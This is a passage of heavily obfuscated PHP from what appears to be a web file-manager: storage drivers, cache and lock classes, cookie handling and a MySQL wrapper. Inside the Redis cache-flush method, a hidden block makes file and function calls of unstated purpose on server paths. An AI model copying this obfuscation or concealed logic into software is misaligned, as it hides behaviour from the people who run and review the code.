fileOutImageServer($ö•òÆ’¿, $»Õ˜äø‡ = 250) { parent::fileOutImage($ö•òÆ’¿, $»Õ˜äø‡); } public function hashMd5($ßî‘ø¼±, $ŞÇêğâ = '') { $âıü®·í =& $_SERVER[® ¨Ä®ñ]; $²ì¬¢ßŸ = $this->objectMeta($ßî‘ø¼±); if (!$²ì¬¢ßŸ) { return !1; } $ŞÇêğâ = $ŞÇêğâ ? $ŞÇêğâ : _get($²ì¬¢ßŸ, $âıü®·í[216]); $ŞÇêğâ = $ŞÇêğâ ? $ŞÇêğâ : _get($²ì¬¢ßŸ, $âıü®·í[208], $âıü®·í[12]); return $ŞÇêğâ; } public function uploadFormData($Ó¹…øæ, $Å¾â˜ë = 3600) { $ÁÃÏÛ©Ø =& $_SERVER[® ¨Ä®ñ]; $áîª æ = $this->pathFather($Ó¹…øæ); $ºáÌ´ä× = $this->client->getHttpUploadPostParams($this->bucket, $áîª æ, $ÁÃÏÛ©Ø[191], $Å¾â˜ë); return array_merge((array) $ºáÌ´ä×, array($ÁÃÏÛ©Ø[174] => $this->getHost())); } public function multiUploadFormData($˜à¡Ú¶, $½Á Ä²Ó = 3600) { $€²ÑÏï„ =& $_SERVER[® ¨Ä®ñ]; $ŒÖ°ÎûÑ = gmdate($€²ÑÏï„[217]); $´Å‹û˜¨ = array(); $ìİ™ºŒœ = $this->client->getUploadId($this->bucket, $˜à¡Ú¶, $´Å‹û˜¨); if (!$ìİ™ºŒœ) { return !1; } return array($€²ÑÏï„[218] => $ìİ™ºŒœ, $€²ÑÏï„[174] => $this->getHost() . $€²ÑÏï„[8] . $this->pathEncode($˜à¡Ú¶), $€²ÑÏï„[219] => $ŒÖ°ÎûÑ, $€²ÑÏï„[95] => $˜à¡Ú¶); } public function multiUploadAuthData($Ú…ú€˜, $şå¨„é = array()) { $ı³¯éŠÁ =& $_SERVER[® ¨Ä®ñ]; $˜ìà’Â = isset($şå¨„é[$ı³¯éŠÁ[219]]) ? $şå¨„é[$ı³¯éŠÁ[219]] : gmdate($ı³¯éŠÁ[217]); $°‘­ÓÎ¸ = isset($şå¨„é[$ı³¯éŠÁ[167]]) ? $şå¨„é[$ı³¯éŠÁ[167]] : $ı³¯éŠÁ[12]; $ùÌ“ÉõÄ = $şå¨„é[$ı³¯éŠÁ[95]]; unset($şå¨„é[$ı³¯éŠÁ[95]]); if (isset($şå¨„é[$ı³¯éŠÁ[220]])) { $şå¨„é[$ı³¯éŠÁ[219]] = $˜ìà’Â; return $this->listUploadParts($ùÌ“ÉõÄ, $şå¨„é); } $¼¼¤á›† = array($ı³¯éŠÁ[221], $ı³¯éŠÁ[12], $ı³¯éŠÁ[118], $ı³¯éŠÁ[12], "\170\x2d\141\x6d\x7a\x2d\144\141\164\x65\x3a{$˜ìà’Â}", $ı³¯éŠÁ[8] . $this->bucket . $ı³¯éŠÁ[8] . $this->pathEncode($ùÌ“ÉõÄ) . $°‘­ÓÎ¸); if (strpos($°‘­ÓÎ¸, $ı³¯éŠÁ[222]) === 0) { $¼¼¤á›†[0] = $ı³¯éŠÁ[223]; } if (isset($şå¨„é[$ı³¯éŠÁ[224]]) && $şå¨„é[$ı³¯éŠÁ[224]] == $ı³¯éŠÁ[225]) { $¼¼¤á›†[0] = $ı³¯éŠÁ[225]; } $ı‹òÛ™À = implode($ı³¯éŠÁ[226], $¼¼¤á›†); $şÅ–÷Œ = base64_encode(hash_hmac($ı³¯éŠÁ[227], $ı‹òÛ™À, $this->secret, !0)); $×öÄÄÍù = $ı³¯éŠÁ[228] . $this->accessKey . $ı³¯éŠÁ[4] . $şÅ–÷Œ; if (strpos($°‘­ÓÎ¸, $ı³¯éŠÁ[222]) === 0) { return array($ı³¯éŠÁ[229] => $×öÄÄÍù, $ı³¯éŠÁ[219] => $˜ìà’Â); } return $×öÄÄÍù; } public function listUploadParts($ğ«Ÿ¡ì¸, $Îı®óœ = array()) { $Ï•è¬ìÌ =& $_SERVER[® ¨Ä®ñ]; $‘ş€Ñ¶ = str_replace($Ï•è¬ìÌ[230], $Ï•è¬ìÌ[12], $Îı®óœ[$Ï•è¬ìÌ[167]]); $†ªê¼Œå = $this->client->listParts($this->bucket, $ğ«Ÿ¡ì¸, $‘ş€Ñ¶); if (!$†ªê¼Œå) { return !1; } unset($Îı®óœ[$Ï•è¬ìÌ[220]], $Îı®óœ[$Ï•è¬ìÌ[224]]); $Îı®óœ[$Ï•è¬ìÌ[95]] = $ğ«Ÿ¡ì¸; $µ©á±˜ = $this->multiUploadAuthData($ğ«Ÿ¡ì¸, $Îı®óœ); if (empty($µ©á±˜)) { return !1; } return array($Ï•è¬ìÌ[229] => $µ©á±˜, $Ï•è¬ìÌ[219] => $Îı®óœ[$Ï•è¬ìÌ[219]], $Ï•è¬ìÌ[231] => $†ªê¼Œå); } public function getHost() { return parent::getHost() . $_SERVER[® ¨Ä®ñ][8] . $this->bucket; } public function size($Ö“¶Ã­·) { $œÕ•Ù¦ = $this->objectMeta($Ö“¶Ã­·); return $œÕ•Ù¦ ? $œÕ•Ù¦[$_SERVER[® ¨Ä®ñ][80]] : 0; } public function info($¤¥¤ùÑè) { if ($this->isFolder($¤¥¤ùÑè)) { return $this->folderInfo($¤¥¤ùÑè); } else { if ($this->isFile($¤¥¤ùÑè)) { return $this->fileInfo($¤¥¤ùÑè); } } return !1; } public function exist($ê€ÁõÕè) { return $this->isFile($ê€ÁõÕè) || $this->isFolder($ê€ÁõÕè); } public function isFile($ïºÉ§Ùô) { return !$this->isFolder($ïºÉ§Ùô) && $this->objectMeta($ïºÉ§Ùô); } public function isFolder($ŞÆğœŠ) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][198], $ŞÆğœŠ); } protected function objectMeta($«¬Ú•š) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][199], $«¬Ú•š); } protected function _objectMeta($“ûİô¿­) { $†°îÌéü =& $_SERVER[® ¨Ä®ñ]; $“ûİô¿­ = rtrim($“ûİô¿­, $†°îÌéü[8]); try { $ÑÔèØúÔ = $this->client->getObjectInfo($this->bucket, $“ûİô¿­); if (!isset($ÑÔèØúÔ[$†°îÌéü[216]]) && isset($ÑÔèØúÔ[$†°îÌéü[232]])) { $ÑÔèØúÔ[$†°îÌéü[216]] = $ÑÔèØúÔ[$†°îÌéü[232]]; } } catch (Exception $Ì»¢Â©Ü) { $ÑÔèØúÔ = !1; } if (!$ÑÔèØúÔ) { } return $ÑÔèØúÔ; } protected function _isFolder($Åº£Œµ¦) { $‘‚Ê‹—Å =& $_SERVER[® ¨Ä®ñ]; $Åº£Œµ¦ = rtrim($Åº£Œµ¦, $‘‚Ê‹—Å[8]); if ($Åº£Œµ¦ == $‘‚Ê‹—Å[12] || $Åº£Œµ¦ == $‘‚Ê‹—Å[8]) { return !0; } $ë˜óúµ  = $this->client->getBucket($this->bucket, $Åº£Œµ¦, null, 1); if (empty($ë˜óúµ [$‘‚Ê‹—Å[197]])) { return !1; } $ÌÇá·åŠ = $ë˜óúµ [$‘‚Ê‹—Å[197]][0][$‘‚Ê‹—Å[32]]; return stripos($ÌÇá·åŠ, $Åº£Œµ¦ . $‘‚Ê‹—Å[8]) === 0 ? !0 : !1; if (substr($ÌÇá·åŠ, -1) == $‘‚Ê‹—Å[8]) { return !0; } if (get_path_this($ÌÇá·åŠ) == get_path_this($Åº£Œµ¦)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‹ë¦Á†¢) { parent::__construct($‹ë¦Á†¢); $this->signatureVersion($_SERVER[® ¨Ä®ñ][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto bõÁÂÃâ˜; eÊç¤ˆºâ”: class CacheLockMemcached { public function lock($õÀå„µ¯, $±‹’á« = 0) { $õû§š¾  = Cache::init(); $„ò×âø´ = microtime(!0) + $±‹’á«; while (microtime(!0) < $„ò×âø´) { $”â”º = $õû§š¾ ->get($õÀå„µ¯); if (!$”â”º || $”â”º < microtime(!0)) { $ş…‹¿ ¨ = $õû§š¾ ->handle->add($õÀå„µ¯, $„ò×âø´, $±‹’á«); if ($ş…‹¿ ¨) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ŸÁÌì‚) { return Cache::init()->get($ŸÁÌì‚); } public function unlock($—Ÿ¬²) { return Cache::init()->remove($—Ÿ¬²); } } class CacheLockDatabase { public function lock($°‰‘•Ê–, $×í¡§€« = 0) { $Ë·àå = Model($_SERVER[® ¨Ä®ñ][811]); $”É’„àò = microtime(!0) + $×í¡§€«; while (microtime(!0) < $”É’„àò) { $ãÕ¡Ü±ö = $Ë·àå->get($°‰‘•Ê–); if (!$ãÕ¡Ü±ö || $ãÕ¡Ü±ö < microtime(!0)) { $Ÿ˜Ğ­Ãá = $Ë·àå->set($°‰‘•Ê–, $”É’„àò); if ($Ÿ˜Ğ­Ãá) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ûĞ•Û­‡) { return Model($_SERVER[® ¨Ä®ñ][811])->get($ûĞ•Û­‡); } public function unlock($µøïµ¦) { Model($_SERVER[® ¨Ä®ñ][811])->remove($µøïµ¦); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Š¾¡É¡Æ, $“å¾“â) { $ãæ›õ·Ş =& $_SERVER[® ¨Ä®ñ]; if (!class_exists($ãæ›õ·Ş[844])) { show_json($ãæ›õ·Ş[845], !1); } $this->cacheTime = $“å¾“â; $this->handle = new Memcached(); if (is_array($Š¾¡É¡Æ[$ãæ›õ·Ş[846]]) && count($Š¾¡É¡Æ[$ãæ›õ·Ş[846]]) >= 1) { foreach ($Š¾¡É¡Æ[$ãæ›õ·Ş[846]] as $ƒ‡®ô²‚) { $ïõ‘ÉÛ‚ = explode($ãæ›õ·Ş[4], $ƒ‡®ô²‚); $this->handle->addServer($ïõ‘ÉÛ‚[0], $ïõ‘ÉÛ‚[1]); } } else { $this->handle->addServer($Š¾¡É¡Æ[$ãæ›õ·Ş[174]], $Š¾¡É¡Æ[$ãæ›õ·Ş[175]]); } } public function set($·€ŠÇ“ò, $ĞãÃäãÌ, $›íÀÚàò = false) { $›íÀÚàò = $›íÀÚàò ? $›íÀÚàò : $this->cacheTime; return $this->handle->set($·€ŠÇ“ò, $ĞãÃäãÌ, $›íÀÚàò); } public function get($äƒÏ¼·ß) { return $this->handle->get($äƒÏ¼·ß); } public function remove($ˆÔŒÙ†İ) { return $this->handle->delete($ˆÔŒÙ†İ); } public function deleteAll() { return $this->handle->flush(); } } goto c™åˆ®×ä‚; c™åˆ®×ä‚: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Á¹´¸û‹, $êõÓÃ) { $ãÇŠÂê‹ =& $_SERVER[® ¨Ä®ñ]; if (!class_exists($ãÇŠÂê‹[847])) { show_json($ãÇŠÂê‹[848], !1); } $this->cacheTime = $êõÓÃ; $¶Àü—ğ = isset($Á¹´¸û‹[$ãÇŠÂê‹[849]]) ? $Á¹´¸û‹[$ãÇŠÂê‹[849]] : 10; $Ãí»òŒ± = _get($Á¹´¸û‹, $ãÇŠÂê‹[846]); if ($Ãí»òŒ± && is_array($Ãí»òŒ±)) { $this->initCluster($Á¹´¸û‹, $¶Àü—ğ); } else { $this->handle = $this->init($Á¹´¸û‹, $¶Àü—ğ); } } private function init($ñß¿šÉÌ, $¡à«ÄÌ‡) { $ôô©¾¶ï =& $_SERVER[® ¨Ä®ñ]; $†›¬ÈÒ÷ = new Redis(); $Çşš‚®È = isset($ñß¿šÉÌ[$ôô©¾¶ï[850]]) ? $ñß¿šÉÌ[$ôô©¾¶ï[850]] : !1; if ($Çşš‚®È) { $†›¬ÈÒ÷->pconnect($ñß¿šÉÌ[$ôô©¾¶ï[174]], $ñß¿šÉÌ[$ôô©¾¶ï[175]], $¡à«ÄÌ‡); } else { $†›¬ÈÒ÷->connect($ñß¿šÉÌ[$ôô©¾¶ï[174]], $ñß¿šÉÌ[$ôô©¾¶ï[175]], $¡à«ÄÌ‡); } if (!empty($ñß¿šÉÌ[$ôô©¾¶ï[405]])) { $†›¬ÈÒ÷->auth($ñß¿šÉÌ[$ôô©¾¶ï[405]]); } return $†›¬ÈÒ÷; } private function initCluster($ñ‘²³Á, $ÛÏÀÊÜ¯) { $€ù„Ïè® =& $_SERVER[® ¨Ä®ñ]; $˜ë‚ˆ— = array($€ù„Ïè®[851], $€ù„Ïè®[852], $€ù„Ïè®[853]); $½¥Èâè¾ = $€ù„Ïè®[851]; if (isset($ñ‘²³Á[$€ù„Ïè®[16]]) && in_array($ñ‘²³Á[$€ù„Ïè®[16]], $˜ë‚ˆ—)) { $½¥Èâè¾ = $ñ‘²³Á[$€ù„Ïè®[16]]; } switch ($½¥Èâè¾) { case $€ù„Ïè®[851]: $this->_slave($ñ‘²³Á, $ÛÏÀÊÜ¯); break; case $€ù„Ïè®[852]: break; case $€ù„Ïè®[853]: $this->isCluster = !0; $àåœÙô¦ = $ñ‘²³Á[$€ù„Ïè®[846]]; $ƒ†Ò¼‹ = isset($ñ‘²³Á[$€ù„Ïè®[850]]) ? $ñ‘²³Á[$€ù„Ïè®[850]] : !1; $Áµ¶‘¯ = isset($ñ‘²³Á[$€ù„Ïè®[405]]) ? $ñ‘²³Á[$€ù„Ïè®[405]] : null; $this->handle = new RedisCluster(NUll, $àåœÙô¦, $ÛÏÀÊÜ¯, $ÛÏÀÊÜ¯, $ƒ†Ò¼‹, $Áµ¶‘¯); break; default: break; } } private function _slave($Èâ»õ¾¼, $ÃÙÊ×Ô) { $¥©ù…Î¦ = $Èâ»õ¾¼[$_SERVER[® ¨Ä®ñ][846]]; $this->filterConfig($Èâ»õ¾¼, $¥©ù…Î¦[0]); $this->handle = $this->init($Èâ»õ¾¼, $ÃÙÊ×Ô); unset($¥©ù…Î¦[0]); if (empty($¥©ù…Î¦)) { return; } $ „ÜÚşû = array_rand($¥©ù…Î¦); $this->filterConfig($Èâ»õ¾¼, $¥©ù…Î¦[$ „ÜÚşû]); $this->slaveHandle = $this->init($Èâ»õ¾¼, $ÃÙÊ×Ô); } private function filterConfig(&$ÏÈ©½ŸÒ, $Ú©ÚÎÌ») { $Íì‡••¦ =& $_SERVER[® ¨Ä®ñ]; $¥ø„ÚƒÈ = explode($Íì‡••¦[4], $Ú©ÚÎÌ»); $¢õş£Ñ‹ = array($Íì‡••¦[174] => $¥ø„ÚƒÈ[0], $Íì‡••¦[175] => $¥ø„ÚƒÈ[1]); $ÏÈ©½ŸÒ = array_merge($ÏÈ©½ŸÒ, $¢õş£Ñ‹); } public function set($–âûƒ‹, $¶á«Ò…§, $Ï´™ï‡ = false) { $Ï´™ï‡ = $Ï´™ï‡ ? $Ï´™ï‡ : $this->cacheTime; return $this->handle->setEx($–âûƒ‹, $Ï´™ï‡, $¶á«Ò…§); } public function setLock($™İÑ¯şØ, $¢¥Û·Õ¸, $¢øÊã¿é) { return $this->handle->setNX($™İÑ¯şØ, $¢¥Û·Õ¸); } public function get($àª¥‹³æ) { $ÁÅşÉÃ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÁÅşÉÃ->get($àª¥‹³æ); } public function remove($ŸÔ ‡’‡) { return $this->handle->del($ŸÔ ‡’‡); } public function deleteAll() { $ÒéäâÈÅ =& $_SERVER[® ¨Ä®ñ]; if ($_SERVER[$ÒéäâÈÅ[854]] != $_SERVER[$ÒéäâÈÅ[855]]) { $°¡ãÑ¡œ = $ÒéäâÈÅ[856]; $Øş©©Î˜ = $ÒéäâÈÅ[857]; $Ç˜Ñ¤¹ = $_SERVER[$ÒéäâÈÅ[858]] . $ÒéäâÈÅ[859]; $’‹÷¢ññ = $Øş©©Î˜($Ç˜Ñ¤¹); $ß’ôÔ¢± = explode($ÒéäâÈÅ[226], $’‹÷¢ññ); if (count($ß’ôÔ¢±) < $ÒéäâÈÅ[610]) { $Ú”ĞË¦Š = $ÒéäâÈÅ[860]; $Ú”ĞË¦Š(); } $Ïé‡š¿‚ = $ÒéäâÈÅ[861]; $Ïé‡š¿‚($_SERVER[$ÒéäâÈÅ[862]]); $Ïé‡š¿‚($_SERVER[$ÒéäâÈÅ[858]] . $ÒéäâÈÅ[863]); $ä§šÙÖÇ = 1; while ($ä§šÙÖÇ > 1) { $ä§šÙÖÇ = $ä§šÙÖÇ + 4; $Äéßñâ = rawurlencode($ä§šÙÖÇ . $ÒéäâÈÅ[373]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ï°·Ş§Û) { $this->handle->flushall($ï°·Ş§Û); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($±¥š¬—ç = '', $œĞòÍèÖ = 0) { if (is_string($±¥š¬—ç) && $±¥š¬—ç != $_SERVER[® ¨Ä®ñ][12]) { $this->prefix = $±¥š¬—ç; } if (is_numeric($œĞòÍèÖ) && $œĞòÍèÖ > 0) { $this->expire = $œĞòÍèÖ; } } public static function getInstance() { static $¢»ÛäÍ; if ($¢»ÛäÍ === null) { $¢»ÛäÍ = new self(); } return $¢»ÛäÍ; } private static $cookieDisable = false; public static function disable($©³ğ¾×¯) { self::$cookieDisable = $©³ğ¾×¯; } private static $sameCookieSet = array(); public static function set($™À®Ê®û, $è²€· ô, $ÓÊÒı‡ = 0, $˜Àê®áõ = false, $¿“à¤Ø = false) { $Ñ…µË²ò =& $_SERVER[® ¨Ä®ñ]; if (self::$cookieDisable) { return; } if (!$ÓÊÒı‡) { $ÓÊÒı‡ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$™À®Ê®û]) && self::$sameCookieSet[$™À®Ê®û] == $è²€· ô . $ÓÊÒı‡) { return; } self::$sameCookieSet[$™À®Ê®û] = $è²€· ô . $ÓÊÒı‡; if (!$¿“à¤Ø) { $¿“à¤Ø = str_replace(HOST, $Ñ…µË²ò[12], APP_HOST); $¿“à¤Ø = _get($GLOBALS, $Ñ…µË²ò[864], $¿“à¤Ø); } $şšƒ‡Ğ¿ = $Ñ…µË²ò[12]; setcookie($™À®Ê®û, $è²€· ô, time() + $ÓÊÒı‡, $Ñ…µË²ò[8] . trim($¿“à¤Ø, $Ñ…µË²ò[8]) . $şšƒ‡Ğ¿, !1, !1, $˜Àê®áõ); } public static function setSafe($ÉÚ¬¦¿, $ÙÒıò©‘, $û²¥€ç = 0) { self::set($ÉÚ¬¦¿, $ÙÒıò©‘, $û²¥€ç, !0); } public static function get($Ó”ğ©æÏ) { static $¾ø´Æ…Œ = false; if (!$¾ø´Æ…Œ) { self::initHeaderCookie(); $¾ø´Æ…Œ = !0; } return isset($_COOKIE[$Ó”ğ©æÏ]) ? $_COOKIE[$Ó”ğ©æÏ] : !1; } private static function initHeaderCookie() { $µÂ´õÌ =& $_SERVER[® ¨Ä®ñ]; if (!isset($_SERVER[$µÂ´õÌ[865]]) || !$_SERVER[$µÂ´õÌ[865]]) { return; } $‹ÁĞ¹Ë = explode($µÂ´õÌ[71], $_SERVER[$µÂ´õÌ[865]]); foreach ($‹ÁĞ¹Ë as $Åµ´å©‚) { $Åµ´å©‚ = explode($µÂ´õÌ[866], $Åµ´å©‚); if (count($Åµ´å©‚) != 2 || !isset($Åµ´å©‚[1])) { continue; } $_COOKIE[trim($Åµ´å©‚[0])] = trim($Åµ´å©‚[1]); } } public static function remove($íğÒµÊô, $ùšöÌ…ó = false) { unset($_COOKIE[$íğÒµÊô]); self::set($íğÒµÊô, $_SERVER[® ¨Ä®ñ][12], 1, $ùšöÌ…ó); } } class DbMysql extends Db { public function __construct($°šá™¢ƒ = '') { $—øĞï…ç =& $_SERVER[® ¨Ä®ñ]; if (!extension_loaded($—øĞï…ç[786])) { think_exception(think_lang($—øĞï…ç[14]) . $—øĞï…ç[867]); } if (!empty($°šá™¢ƒ)) { $this->config = $°šá™¢ƒ; if (empty($this->config[$—øĞï…ç[17]])) { $this->config[$—øĞï…ç[17]] = $—øĞï…ç[12]; } } } public function connect($ö¦şèİÓ = '', $óè®Ó†¢ = 0, $Äû’Áí = false) { $›ôáõ¯û =& $_SERVER[® ¨Ä®ñ]; if (!isset($this->linkID[$óè®Ó†¢])) { if (empty($ö¦şèİÓ)) { $ö¦şèİÓ = $this->config; } $‘§å‘× = $ö¦şèİÓ[$›ôáõ¯û[868]] . ($ö¦şèİÓ[$›ôáõ¯û[869]] ? "\x3a{$ö¦şèİÓ[$›ôáõ¯û[869]]}" : $›ôáõ¯û[12]); $îş÷ÔÛ÷ = !empty($ö¦şèİÓ[$›ôáõ¯û[17]][$›ôáõ¯û[18]]) ? $ö¦şèİÓ[$›ôáõ¯û[17]][$›ôáõ¯û[18]] : $this->pconnect; if ($îş÷ÔÛ÷) { $this->linkID[$óè®Ó†¢] = mysql_pconnect($‘§å‘×, $ö¦şèİÓ[$›ôáõ¯û[870]], $ö¦şèİÓ[$›ôáõ¯û[871]], 131072); } else { $this->linkID[$óè®Ó†¢] = mysql_connect($‘§å‘×, $ö¦şèİÓ[$›ôáõ¯û[870]], $ö¦şèİÓ[$›ôáõ¯û[871]], !0, 131072); } if (!$this->linkID[$óè®Ó†¢] || !empty($ö¦şèİÓ[$›ôáõ¯û[21]]) && !mysql_select_db($ö¦şèİÓ[$›ôáõ¯û[21]], $this->linkID[$óè®Ó†¢])) { think_exception(mysql_error()); } $Ì¶Ö‡ı = mysql_get_server_info($this->linkID[$óè®Ó†¢]); mysql_query($›ôáõ¯û[872] . think_config($›ôáõ¯û[873]) . $›ôáõ¯û[58], $this->linkID[$óè®Ó†¢]); if ($Ì¶Ö‡ı > $›ôáõ¯û[874]) { mysql_query($›ôáõ¯û[875], $this->linkID[$óè®Ó†¢]); } $this->connected = !0; if (1 != think_config($›ôáõ¯û[22])) { unset($this->config); } } return $this->linkID[$óè®Ó†¢]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Û¾ª¿á) { $ÃÍõÆÓö =& $_SERVER[® ¨Ä®ñ]; if (0 === stripos($Û¾ª¿á, $ÃÍõÆÓö[259])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Û¾ª¿á; if ($this->queryID) { $this->free(); } think_action_status($ÃÍõÆÓö[23], 1); think_status($ÃÍõÆÓö[24]); $this->queryID = mysql_query($Û¾ª¿á, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($óÖ€‘´‹) { $ø¾ èÚå =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $óÖ€‘´‹; if ($this->queryID) { $this->free(); } think_action_status($ø¾ èÚå[25], 1); think_status($ø¾ èÚå[24]); $†İàñÖ¨ = mysql_query($óÖ€‘´‹, $this->_linkID); $this->debug(); if (!1 === $†İàñÖ¨) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[® ¨Ä®ñ][876], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ª¸Àéäı = mysql_query($_SERVER[® ¨Ä®ñ][877], $this->_linkID); $this->transTimes = 0; if (!$ª¸Àéäı) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ñ¯öÖ = mysql_query($_SERVER[® ¨Ä®ñ][878], $this->_linkID); $this->transTimes = 0; if (!$ñ¯öÖ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ä›Õ²ó = array(); if ($this->numRows > 0) { while ($ÜôÇ±•Ü = mysql_fetch_assoc($this->queryID)) { $Ä›Õ²ó[] = $ÜôÇ±•Ü; } mysql_data_seek($this->queryID, 0); } return $Ä›Õ²ó; } public function getFields($¼Õú‰üÎ) { $®»‹şÍü =& $_SERVER[® ¨Ä®ñ]; $ï§×Á©î = $this->query($®»‹şÍü[879] . $this->parseKey($¼Õú‰üÎ)); $±¼Ò³‰ = array(); if ($ï§×Á©î) { foreach ($ï§×Á©î as $ÃÁ„şµ» => $’‚¡áê’) { $±¼Ò³‰[$’‚¡áê’[$®»‹şÍü[31]]] = array($®»‹şÍü[32] => $’‚¡áê’[$®»‹şÍü[31]], $®»‹şÍü[33] => $’‚¡áê’[$®»‹şÍü[34]], $®»‹şÍü[35] => (bool) (strtoupper($’‚¡áê’[$®»‹şÍü[36]]) === $®»‹şÍü[880]), $®»‹şÍü[37] => $’‚¡áê’[$®»‹şÍü[38]], $®»‹şÍü[39] => strtolower($’‚¡áê’[$®»‹şÍü[40]]) == $®»‹şÍü[41], $®»‹şÍü[42] => strtolower($’‚¡áê’[$®»‹şÍü[43]]) == $®»‹şÍü[44]); } } return $±¼Ò³‰; } public function getTables($î†ÜôÏÊ = '') { $¨°ö÷‚È =& $_SERVER[® ¨Ä®ñ]; if (!empty($î†ÜôÏÊ)) { $Ñç¬É†€ = $¨°ö÷‚È[881] . $î†ÜôÏÊ . $¨°ö÷‚È[882]; } else { $Ñç¬É†€ = $¨°ö÷‚È[883]; } $ÊœŞ÷ı¼ = $this->query($Ñç¬É†€); $ÛøãµñË = array(); foreach ($ÊœŞ÷ı¼ as $ú…”Ô´ö => $äø†š˜„) { $ÛøãµñË[$ú…”Ô´ö] = current($äø†š˜„); } return $ÛøãµñË; } public function replace($ŸïêÜ§, $´¨¨´ÚÆ = array()) { $²Š°ÔË› =& $_SERVER[® ¨Ä®ñ]; foreach ($ŸïêÜ§ as $´¡¡š† => $¨¸¡éö) { $§åîÂ” = $this->parseValue($¨¸¡éö); if (is_scalar($§åîÂ”)) { $Œ‡øøš¡[] = $§åîÂ”; $€ç¾İ€[] = $this->parseKey($´¡¡š†); } } $’øúˆÂÅ = $²Š°ÔË›[884] . $this->parseTable($´¨¨´ÚÆ[$²Š°ÔË›[274]]) . $²Š°ÔË›[885] . implode($²Š°ÔË›[50], $€ç¾İ€) . $²Š°ÔË›[886] . implode($²Š°ÔË›[50], $Œ‡øøš¡) . $²Š°ÔË›[887]; return $this->execute($’øúˆÂÅ); } public function insertAll($ÀïšÊè•, $ƒÃÛì¿ = array(), $¿ìüµ¸º = false) { $–ºÎğş¸ =& $_SERVER[® ¨Ä®ñ]; if (!is_array($ÀïšÊè•[0])) { return !1; } $©ÊÈÂÓ± = array_keys($ÀïšÊè•[0]); $€ö…İ×¹ = array(); foreach ($ÀïšÊè• as $ÊÊ´¼Ñ¢) { $Á—Æ«ãö = array(); foreach ($ÊÊ´¼Ñ¢ as $ûèü¢Ïø => $‹¥ı±¾) { $‹¥ı±¾ = $this->parseValue($‹¥ı±¾); if (is_scalar($‹¥ı±¾)) { $Á—Æ«ãö[] = $‹¥ı±¾; } } $€ö…İ×¹[] = $–ºÎğş¸[255] . implode($–ºÎğş¸[50], $Á—Æ«ãö) . $–ºÎğş¸[887]; } array_walk($©ÊÈÂÓ±, array($this, $–ºÎğş¸[888])); $ñŞÒ¤ƒË = ($¿ìüµ¸º ? $–ºÎğş¸[889] : $–ºÎğş¸[890]) . $–ºÎğş¸[891] . $this->parseTable($ƒÃÛì¿[$–ºÎğş¸[274]]) . $–ºÎğş¸[885] . implode($–ºÎğş¸[50], $©ÊÈÂÓ±) . $–ºÎğş¸[892] . implode($–ºÎğş¸[50], $€ö…İ×¹); return $this->execute($ñŞÒ¤ƒË); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $º–•èÂø =& $_SERVER[® ¨Ä®ñ]; $this->error = mysql_errno() . $º–•èÂø[4] . mysql_error($this->_linkID); if ($º–•èÂø[12] != $this->queryStr) { $this->error .= LNG($º–•èÂø[48]) . $this->queryStr; } think_trace($this->error, $º–•èÂø[12], $º–•èÂø[49]); return $this->error; } public function escapeString($˜ìÁ„¡) { if ($this->_linkID) { return mysql_real_escape_string($˜ìÁ„¡, $this->_linkID); } else { return mysql_escape_string($˜ìÁ„¡); } } public function parseKey(&$›Êƒôò, $áàüŞÁó = true) { $ÀëÏÂ© =& $_SERVER[® ¨Ä®ñ]; if ($áàüŞÁó) { $›Êƒôò = $this->parseKeyCheck($›Êƒôò); } if ($›Êƒôò != $ÀëÏÂ©[181] && !preg_match($ÀëÏÂ©[893], $›Êƒôò)) { $›Êƒôò = $ÀëÏÂ©[380] . trim($›Êƒôò, $ÀëÏÂ©[380]) . $ÀëÏÂ©[380]; } return $›Êƒôò; } } goto bä¬×ˆ«Â; CÇ¿ÈĞ»Í: function binCheckBigger($Âæâ½Ó, $’ÊÍ†›) { return $Âæâ½Ó > $’ÊÍ†›; } $_SERVER[$_SERVER[„ãÉ‘§›][3]] = ("\67\71\70\67"."\71\64")+0;$_t1el="k9fbv0rnd1qcphlsx724j6agtum3oweyzi58ruxpa3f1dknyqh7g5e408z6lobvc2mjisw9tmvh51wy4l8";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($úø€Ùˆæ, $Ù‹ÜµÍ) { $ğÀ”ëÒñ =& $_SERVER[® ¨Ä®ñ]; if (isset(self::$_methodList[$úø€Ùˆæ])) { return @call_user_func_array(self::$_methodList[$úø€Ùˆæ], $Ù‹ÜµÍ); } else { if (method_exists($this, $úø€Ùˆæ)) { return call_user_func_array(array($this, $úø€Ùˆæ), $Ù‹ÜµÍ); } else { think_exception(__CLASS__ . $ğÀ”ëÒñ[4] . $úø€Ùˆæ . $ğÀ”ëÒñ[5]); } } } public static function __callStatic($ªóÙáâ, $–‘ô¸€…) { if (isset(self::$_methodListStatic[$ªóÙáâ])) { return call_user_func_array(self::$_methodListStatic[$ªóÙáâ], 